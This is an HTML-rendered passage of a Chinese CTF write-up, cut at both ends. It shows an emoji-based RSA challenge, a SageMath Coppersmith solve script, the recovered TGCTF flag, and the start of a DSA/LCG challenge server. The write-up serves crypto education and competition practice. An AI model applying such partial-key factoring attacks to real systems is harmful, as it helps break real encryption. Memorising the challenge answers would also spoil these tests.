class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">genarate_emojiiiiii_prime</span><span class=\"token punctuation\">(</span>nbits<span class=\"token punctuation\">,</span> base<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>base <span class=\"token operator\">//</span> <span class=\"token number\">32</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> base <span class=\"token operator\">>=</span> <span class=\"token number\">3</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>nbits <span class=\"token operator\">//</span> <span class=\"token number\">8</span> <span class=\"token operator\">//</span> <span class=\"token number\">4</span> <span class=\"token operator\">-</span> base <span class=\"token operator\">//</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> get_random_emojiiiiii<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 猜一猜</span>\n        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> p\n\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>long_to_bytes<span class=\"token punctuation\">(</span>get_random_emojiiiiii<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> genarate_emojiiiiii_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> genarate_emojiiiiii_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\n\nn <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q\ne <span class=\"token operator\">=</span> <span class=\"token string\">\"💯\"</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> bytes_to_long<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p0 =\"</span><span class=\"token punctuation\">,</span> long_to_bytes<span class=\"token punctuation\">(</span>p <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">**</span> <span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n =\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c =\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n\np0 <span class=\"token operator\">=</span> <span class=\"token string\">'😘😾😂😋😶😾😳😷'</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></code></pre>\n\n<p>根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位</p>\n<p>题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可</p>\n<p>知道低32*9&#x3D;288位即可copper得到p</p>\n<p>e和phi有公共因子，有限域开方crt遍历一下即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np0_ <span class=\"token operator\">=</span> <span class=\"token number\">108837065531980906150333850570890620719343963272506332719822248235755953428663</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span>\n\na<span class=\"token operator\">=</span><span class=\"token number\">4036991100</span>\n\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    f <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">288</span> <span class=\"token operator\">+</span> p0_ <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span>\n    f <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">225</span><span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span>epsilon<span class=\"token operator\">=</span><span class=\"token number\">0.04</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> roots<span class=\"token punctuation\">:</span>\n        x <span class=\"token operator\">=</span> roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        p_candidate <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">288</span> <span class=\"token operator\">+</span> p0_ <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> p_candidate <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found p:\"</span><span class=\"token punctuation\">,</span> p_candidate<span class=\"token punctuation\">)</span>\n            q_candidate <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> p_candidate\n            <span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p_candidate<span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q_candidate<span class=\"token punctuation\">)</span>\ne<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">4036989615</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>n<span class=\"token operator\">%</span>p<span class=\"token punctuation\">,</span>n<span class=\"token operator\">%</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token operator\">//</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nc<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>y<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nf<span class=\"token operator\">=</span>y<span class=\"token operator\">^</span><span class=\"token number\">15</span><span class=\"token operator\">-</span>c\nf<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nm1<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>z<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nf<span class=\"token operator\">=</span>z<span class=\"token operator\">^</span><span class=\"token number\">15</span><span class=\"token operator\">-</span>c\nf<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nm2<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m1<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> m2<span class=\"token punctuation\">:</span>\n        m<span class=\"token operator\">=</span>solve_crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">b'TGCTF'</span> <span class=\"token keyword\">in</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了</p>\n<blockquote>\n<p>TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢</p>\n</blockquote>\n<h3 id=\"LLLCG\"><a href=\"#LLLCG\" class=\"headerlink\" title=\"LLLCG\"></a><strong><strong>LLLCG</strong></strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha256\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">import</span> socketserver\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> dsa_p<span class=\"token punctuation\">,</span> dsa_q\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TripleLCG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">]</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> b\n        self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c\n        self<span class=\"token punctuation\">.</span>d <span class=\"token operator\">=</span> d\n        self<span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>n\n        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> new\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">DSA</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># while True:</span>\n            <span class=\"token comment\"># self.q = getPrime(160)</span>\n            <span class=\"token comment\"># t = 2 * getPrime(1024 - 160) * self.q</span>\n            <span class=\"token comment\"># if isPrime(t + 1):</span>\n            <span class=\"token comment\">#    self.p = t + 1</span>\n            <span class=\"token comment\">#    break</span>\n        self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">=</span> dsa_p\n        self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">=</span> dsa_q\n        self<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>inverse<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> r <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q <span class=\"token keyword\">and</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> s <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        w <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span>\n        u1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        u2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        v <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> u1<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> u2<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> v <span class=\"token operator\">==</span> r\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Task</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>BaseRequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">_recvall</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        BUFF_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">2048</span>\n        data <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n            part <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>BUFF_SIZE<span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">+=</span> part\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>part<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> BUFF_SIZE<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">return</span> data<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> newline<span class=\"token punctuation\">:</span>\n            msg <span class=\"token operator\">+=</span> <span class=\"token string\">b'\\n'</span>\n        self<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> prompt<span class=\"token operator\">=</span><span class=\"token string\">b'[-] '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>prompt<span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>_recvall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        n <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n        lcg <span class=\"token operator\">=</span> 